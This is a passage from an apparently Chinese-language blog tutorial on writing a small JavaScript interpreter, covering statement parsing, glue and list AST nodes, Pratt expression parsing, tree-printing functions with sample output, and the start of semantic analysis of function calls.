class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;)&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;;&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;&#125;&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;log&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;(&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;c&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;)&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;;&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h2><p><strong>各种语句的处理</strong></p>
<p>需要处理的语句有如下几种：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">statement</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> tree=<span class="literal">null</span>,left=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">let</span> &#123;token&#125; = gData;</span><br><span class="line">    getNextToken();</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="keyword">switch</span>(token.type)&#123;</span><br><span class="line">            <span class="keyword">case</span> tokenTypes.T_VAR:</span><br><span class="line">            <span class="keyword">case</span> tokenTypes.T_ARGUMENT:</span><br><span class="line">                left = varDeclaration();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> tokenTypes.T_IF:</span><br><span class="line">                left = ifStatement();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> tokenTypes.T_WHILE:</span><br><span class="line">                left = whileStatement();</span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">            <span class="keyword">case</span> tokenTypes.T_FUN:</span><br><span class="line">                left = funStatement();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> tokenTypes.T_RETURN:</span><br><span class="line">                left = returnStatement();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> tokenTypes.T_EOF:</span><br><span class="line">            <span class="keyword">case</span> tokenTypes.T_RBR:</span><br><span class="line">            <span class="keyword">case</span> tokenTypes.T_RPT:</span><br><span class="line">                <span class="keyword">return</span> tree;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">if</span>(prefixParserMap[token.type])&#123;</span><br><span class="line">                    left = normalStatement();</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    printErr(<span class="string">`unknown Syntax:<span class="subst">$&#123;token.type&#125;</span> , at <span class="subst">$&#123;gData.line&#125;</span> line`</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(left !== <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tree === <span class="literal">null</span>)&#123;</span><br><span class="line">                tree = left;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                tree = <span class="keyword">new</span> ASTNode().initTwoNode(ASTNodeTypes.T_GLUE,tree,left,<span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>glue结点的使用</strong></p>
<p>在语法分析生成 AST 的过程中，可能会遇到一些没有关键的并列语句：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> c = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">var</span> d = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">var</span> e = <span class="number">5</span>;</span><br></pre></td></tr></table></figure>
<p>这些语句看似是并列结构，但解释器往往会将其理解成有着父子结点关系的树形结构：</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">glue</span><br><span class="line">|<span class="string">----glue</span></span><br><span class="line"><span class="string"></span>|<span class="string">    </span>|<span class="string">----glue</span></span><br><span class="line"><span class="string"></span>|<span class="string">    </span>|<span class="string">    </span>|<span class="string">----glue</span></span><br><span class="line"><span class="string"></span>|<span class="string">    </span>|<span class="string">    </span>|<span class="string">    </span>|<span class="string">----a</span></span><br><span class="line"><span class="string">e    d    c    b      </span></span><br></pre></td></tr></table></figure>
<ul>
<li>解释器会先读取 <code>var a = 1</code> 进而生成 <code>a</code> 节点</li>
<li>接着读取 <code>var b = 2</code> 生成 <code>b</code> 节点，然后创建 <code>glue</code> 节点作为 <code>a b</code> 的父节点</li>
</ul>
<p>打印出的 AST 信息如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> || [_glue] (null),(null)</span><br><span class="line">--- || [_glue] (null),(null)</span><br><span class="line">------ || [_glue] (null),(null)</span><br><span class="line">--------- || [_glue] (null),(null)</span><br><span class="line">------------ || [_glue] (null),(null)</span><br><span class="line">--------------- || [var] (a),(null)</span><br><span class="line">--------------- || [=] (null),(null)</span><br><span class="line">------------------ || [number] (<span class="number">1</span>),(null)</span><br><span class="line">------------------ || [leftValue] (a),(null)</span><br><span class="line">------------ || [_glue] (null),(null)</span><br><span class="line">--------------- || [var] (b),(null)</span><br><span class="line">--------------- || [=] (null),(null)</span><br><span class="line">------------------ || [number] (<span class="number">2</span>),(null)</span><br><span class="line">------------------ || [leftValue] (b),(null)</span><br><span class="line">--------- || [_glue] (null),(null)</span><br><span class="line">------------ || [var] (c),(null)</span><br><span class="line">------------ || [=] (null),(null)</span><br><span class="line">--------------- || [number] (<span class="number">3</span>),(null)</span><br><span class="line">--------------- || [leftValue] (c),(null)</span><br><span class="line">------ || [_glue] (null),(null)</span><br><span class="line">--------- || [var] (d),(null)</span><br><span class="line">--------- || [=] (null),(null)</span><br><span class="line">------------ || [number] (<span class="number">4</span>),(null)</span><br><span class="line">------------ || [leftValue] (d),(null)</span><br><span class="line">--- || [_glue] (null),(null)</span><br><span class="line">------ || [var] (e),(null)</span><br><span class="line">------ || [=] (null),(null)</span><br><span class="line">--------- || [number] (<span class="number">5</span>),(null)</span><br><span class="line">--------- || [leftValue] (e),(null)</span><br></pre></td></tr></table></figure>
<p><strong>列表结点的使用</strong></p>
<p>在语法分析生成 AST 的过程中，可能会遇到没法简单处理成树形结构的数据：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a,b,c,d,e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b+c+d+e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"><span class="keyword">var</span> test = add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>由于 <code>add(1,2,3,4,5)</code> 中的参数必须分析为并列结构，因此这里需要使用列表来存储参数节点</li>
<li>对于函数参数和列表都需要这种处理方式</li>
</ul>
<p>打印出的 AST 信息如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> || [_glue] (null),(null)</span><br><span class="line">--- || [_glue] (null),(null)</span><br><span class="line">------ || [function] (add),(null)</span><br><span class="line">--------- || [_glue] (null),(null)</span><br><span class="line">------------ || [_glue] (null),(null)</span><br><span class="line">--------------- || [_glue] (null),(null)</span><br><span class="line">------------------ || [_glue] (null),(null)</span><br><span class="line">--------------------- || [argument] (a),(<span class="number">0</span>)</span><br><span class="line">--------------------- || [argument] (b),(<span class="number">1</span>)</span><br><span class="line">------------------ || [argument] (c),(<span class="number">2</span>)</span><br><span class="line">--------------- || [argument] (d),(<span class="number">3</span>)</span><br><span class="line">------------ || [argument] (e),(<span class="number">4</span>)</span><br><span class="line">--------- || [<span class="keyword">return</span>] (null),(null)</span><br><span class="line">------------ || [+] (null),(null)</span><br><span class="line">--------------- || [+] (null),(null)</span><br><span class="line">------------------ || [+] (null),(null)</span><br><span class="line">--------------------- || [+] (null),(null)</span><br><span class="line">------------------------ || [identifier] (a),(null)</span><br><span class="line">------------------------ || [identifier] (b),(null)</span><br><span class="line">--------------------- || [identifier] (c),(null)</span><br><span class="line">------------------ || [identifier] (d),(null)</span><br><span class="line">--------------- || [identifier] (e),(null)</span><br><span class="line">------ || [_glue] (null),(null)</span><br><span class="line">--------- || [var] (a),(null)</span><br><span class="line">--------- || [=] (null),(null)</span><br><span class="line">------------ || [<span class="built_in">array</span>] ([ [ASTNode], [ASTNode], [ASTNode], [ASTNode], [ASTNode] ]),(null)</span><br><span class="line">------------ || [leftValue] (a),(null)</span><br><span class="line">--- || [_glue] (null),(null)</span><br><span class="line">------ || [var] (test),(null)</span><br><span class="line">------ || [=] (null),(null)</span><br><span class="line">--------- || [execute function] (add),(null)</span><br><span class="line">------------ || [args] ([ [ASTNode], [ASTNode], [ASTNode], [ASTNode], [ASTNode] ]),(null)</span><br><span class="line">--------- || [leftValue] (test),(null)</span><br></pre></td></tr></table></figure>
<p><strong>普拉特分析法处理表达式</strong></p>
<p>Pratt Parsing 是一种循环与递归相结合的算法，需要对以下两种表达式进行处理：</p>
<ul>
<li>前缀表达式：一个操作符放在数字的前面（<code>-a</code>，<code>!a</code>，<code>&quot;a&quot;</code>，<code>[a]</code> ……）</li>
<li>中缀表达式：操作符在两个操作数的中间（<code>a + b</code>，<code>a * c</code> ……）</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prefix</span>(<span class="params">type</span>)</span>&#123; <span class="comment">/* 处理前缀 */</span></span><br><span class="line">    getNextToken();</span><br><span class="line">    <span class="keyword">let</span> right = parseExpression(precedenceList.prefix);</span><br><span class="line">    putBackToken(gData.token);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ASTNode().initUnaryNode(type,right,<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">infix</span>(<span class="params">precedence,left,type</span>)</span>&#123; <span class="comment">/* 处理中缀 */</span></span><br><span class="line">    <span class="keyword">let</span> right = parseExpression(precedence);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ASTNode().initTwoNode(type,left,right,<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>前缀表达式的优先级往往是最高的</li>
<li>这里的函数调用是一个例外：原本函数调用属于前缀表达式，但本程序在识别 token 时会将函数名识别为 <code>identifier</code>，将左括号识别为符号，将参数识别为 <code>identifier</code>，这样函数调用就被当成了中缀表达式</li>
</ul>
<p>下面看两个例子：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = <span class="number">7</span>*<span class="number">8</span>+<span class="number">9</span>;</span><br><span class="line">||_glue <span class="literal">null</span> <span class="literal">null</span></span><br><span class="line">---||<span class="keyword">var</span> c <span class="literal">null</span></span><br><span class="line">---||= <span class="literal">null</span> <span class="literal">null</span></span><br><span class="line">------||+ <span class="literal">null</span> <span class="literal">null</span></span><br><span class="line">---------||* <span class="literal">null</span> <span class="literal">null</span></span><br><span class="line">------------||number <span class="number">7</span> <span class="literal">null</span></span><br><span class="line">------------||number <span class="number">8</span> <span class="literal">null</span></span><br><span class="line">---------||number <span class="number">9</span> <span class="literal">null</span></span><br><span class="line">------||leftValue c <span class="literal">null</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>+</code> 优先级小于 <code>*</code>，因此 <code>7 * 8</code> 先回溯生成树，接着正常处理后续表达式生成 <code>exp + 9</code> 的树</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = <span class="number">7</span>*(<span class="number">8</span>+<span class="number">9</span>);</span><br><span class="line">||_glue <span class="literal">null</span> <span class="literal">null</span></span><br><span class="line">---||<span class="keyword">var</span> c <span class="literal">null</span></span><br><span class="line">---||= <span class="literal">null</span> <span class="literal">null</span></span><br><span class="line">------||* <span class="literal">null</span> <span class="literal">null</span></span><br><span class="line">---------||number <span class="number">7</span> <span class="literal">null</span></span><br><span class="line">---------||+ <span class="literal">null</span> <span class="literal">null</span></span><br><span class="line">------------||number <span class="number">8</span> <span class="literal">null</span></span><br><span class="line">------------||number <span class="number">9</span> <span class="literal">null</span></span><br><span class="line">------||leftValue c <span class="literal">null</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li><code>()</code> 优先级小于 <code>*</code>，因此继续处理直到表达式结束后回溯，依次生成 <code>8 + 9</code> 和 <code>7 * exp</code> 的树</li>
</ul>
<p><strong>打印树形结构</strong></p>
<p>基础版：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printTree</span>(<span class="params">ast,index</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!ast) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;%s || [%s] (%s)&quot;</span>, <span class="built_in">Array</span>(index+<span class="number">1</span>).join(<span class="string">&quot;-&quot;</span>),ast.op,ast.value);</span><br><span class="line">    index+=<span class="number">3</span>;</span><br><span class="line">    printTree(ast.left,index);</span><br><span class="line">    printTree(ast.mid,index);</span><br><span class="line">    printTree(ast.right,index);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>优化版：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> printTree = <span class="function"><span class="keyword">function</span> (<span class="params">ast, pre=[<span class="string">&quot; ──&quot;</span>]</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!ast) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; pre.length; i++) &#123;</span><br><span class="line">        process.stdout.write(pre[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[%s] (%s)&quot;</span>, ast.op,ast.value);</span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> bac = pre[pre.length - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> (pre[pre.length - <span class="number">1</span>] === <span class="string">&quot; ├──&quot;</span>) &#123;</span><br><span class="line">        pre[pre.length - <span class="number">1</span>] = <span class="string">&quot; │  &quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        pre[pre.length - <span class="number">1</span>] = <span class="string">&quot;    &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; pre.length; i++) &#123;</span><br><span class="line">        process.stdout.write(pre[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ast.left || ast.mid || ast.right)</span><br><span class="line">        process.stdout.write(<span class="string">&quot; │  &quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log();</span><br><span class="line"></span><br><span class="line">    pre.push(<span class="string">&quot; ├──&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!ast.mid &amp;&amp; !ast.right)&#123;</span><br><span class="line">        pre[pre.length - <span class="number">1</span>] = <span class="string">&quot; └──&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printTree(ast.left,pre);</span><br><span class="line">    <span class="keyword">if</span>(!ast.right)&#123;</span><br><span class="line">        pre[pre.length - <span class="number">1</span>] = <span class="string">&quot; └──&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printTree(ast.mid,pre);</span><br><span class="line">    pre[pre.length - <span class="number">1</span>] = <span class="string">&quot; └──&quot;</span>;</span><br><span class="line">    printTree(ast.right,pre);</span><br><span class="line">    </span><br><span class="line">    pre.pop();</span><br><span class="line">    pre[pre.length - <span class="number">1</span>] = bac;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>优化版效果图：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> c = a + b*add(a,b);</span><br><span class="line">log(c);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">──<span class="selector-attr">[_glue]</span> (null)</span><br><span class="line">    │  </span><br><span class="line">    ├──<span class="selector-attr">[_glue]</span> (null)</span><br><span class="line">    │   │  </span><br><span class="line">    │   ├──<span class="selector-attr">[_glue]</span> (null)</span><br><span class="line">    │   │   │  </span><br><span class="line">    │   │   ├──<span class="selector-attr">[_glue]</span> (null)</span><br><span class="line">    │   │   │   │  </span><br><span class="line">    │   │   │   ├──<span class="selector-attr">[function]</span> (add)</span><br><span class="line">    │   │   │   │   │  </span><br><span class="line">    │   │   │   │   ├──<span class="selector-attr">[_glue]</span> (null)</span><br><span class="line">    │   │   │   │   │   │  </span><br><span class="line">    │   │   │   │   │   ├──<span class="selector-attr">[argument]</span> (a)</span><br><span class="line">    │   │   │   │   │   │  </span><br><span class="line">    │   │   │   │   │   └──<span class="selector-attr">[argument]</span> (b)</span><br><span class="line">    │   │   │   │   │      </span><br><span class="line">    │   │   │   │   └──<span class="selector-attr">[return]</span> (null)</span><br><span class="line">    │   │   │   │       │  </span><br><span class="line">    │   │   │   │       └──<span class="selector-attr">[+]</span> (null)</span><br><span class="line">    │   │   │   │           │  </span><br><span class="line">    │   │   │   │           ├──<span class="selector-attr">[identifier]</span> (a)</span><br><span class="line">    │   │   │   │           │  </span><br><span class="line">    │   │   │   │           └──<span class="selector-attr">[identifier]</span> (b)</span><br><span class="line">    │   │   │   │              </span><br><span class="line">    │   │   │   └──<span class="selector-attr">[_glue]</span> (null)</span><br><span class="line">    │   │   │       │  </span><br><span class="line">    │   │   │       ├──<span class="selector-attr">[var]</span> (a)</span><br><span class="line">    │   │   │       │  </span><br><span class="line">    │   │   │       └──<span class="selector-attr">[=]</span> (null)</span><br><span class="line">    │   │   │           │  </span><br><span class="line">    │   │   │           ├──<span class="selector-attr">[number]</span> (<span class="number">1</span>)</span><br><span class="line">    │   │   │           │  </span><br><span class="line">    │   │   │           └──<span class="selector-attr">[leftValue]</span> (a)</span><br><span class="line">    │   │   │              </span><br><span class="line">    │   │   └──<span class="selector-attr">[_glue]</span> (null)</span><br><span class="line">    │   │       │  </span><br><span class="line">    │   │       ├──<span class="selector-attr">[var]</span> (b)</span><br><span class="line">    │   │       │  </span><br><span class="line">    │   │       └──<span class="selector-attr">[=]</span> (null)</span><br><span class="line">    │   │           │  </span><br><span class="line">    │   │           ├──<span class="selector-attr">[number]</span> (<span class="number">2</span>)</span><br><span class="line">    │   │           │  </span><br><span class="line">    │   │           └──<span class="selector-attr">[leftValue]</span> (b)</span><br><span class="line">    │   │              </span><br><span class="line">    │   └──<span class="selector-attr">[_glue]</span> (null)</span><br><span class="line">    │       │  </span><br><span class="line">    │       ├──<span class="selector-attr">[var]</span> (c)</span><br><span class="line">    │       │  </span><br><span class="line">    │       └──<span class="selector-attr">[=]</span> (null)</span><br><span class="line">    │           │  </span><br><span class="line">    │           ├──<span class="selector-attr">[+]</span> (null)</span><br><span class="line">    │           │   │  </span><br><span class="line">    │           │   ├──<span class="selector-attr">[identifier]</span> (a)</span><br><span class="line">    │           │   │  </span><br><span class="line">    │           │   └──<span class="selector-attr">[*]</span> (null)</span><br><span class="line">    │           │       │  </span><br><span class="line">    │           │       ├──<span class="selector-attr">[identifier]</span> (b)</span><br><span class="line">    │           │       │  </span><br><span class="line">    │           │       └──<span class="selector-attr">[execute function]</span> (add)</span><br><span class="line">    │           │           │  </span><br><span class="line">    │           │           └──<span class="selector-attr">[args]</span> ([ [ASTNode], [ASTNode] ])</span><br><span class="line">    │           │              </span><br><span class="line">    │           └──<span class="selector-attr">[leftValue]</span> (c)</span><br><span class="line">    │              </span><br><span class="line">    └──<span class="selector-attr">[execute function]</span> (log)</span><br><span class="line">        │  </span><br><span class="line">        └──<span class="selector-attr">[args]</span> ([ [ASTNode] ])</span><br></pre></td></tr></table></figure>
<h2 id="语义分析"><a href="#语义分析" class="headerlink" title="语义分析"></a>语义分析</h2><p><strong>处理函数调用</strong></p>
<p>当遇到函数调用时，可能有如下3种情况：</p>
<ul>
<li>该函数是解释器内置的</li>
<li>该函数是源程序定义的</li>
<li>该函数没有定义</li>
</ul>
<p>如果该函数是解释器内置的，解释器会尝试在 <code>buildInMethods</code> 中查找该函数：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(buildInMethods[astNode.value])&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [];</span><br><span class="line">    <span class="keyword">let</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">typeof</span> argument[i] !== <span class="string">&quot;undefined&quot;</span>)&#123;</span><br><span class="line">        arr.push(argument[i]);</span><br><span class="line">        ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    buildInMethods[astNode.value](...arr);</span><br></pre></td></tr></table></figure>
<p>如果该函数是源程序定义的，解释器需要知道该函数的具体实现：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ASTNodeTypes.T_FUNCALL:</span><br><span class="line">	<span class="keyword">return</span> interpretFunCallAST(astNode,scope);</span><br></pre></td></tr></table></figure>
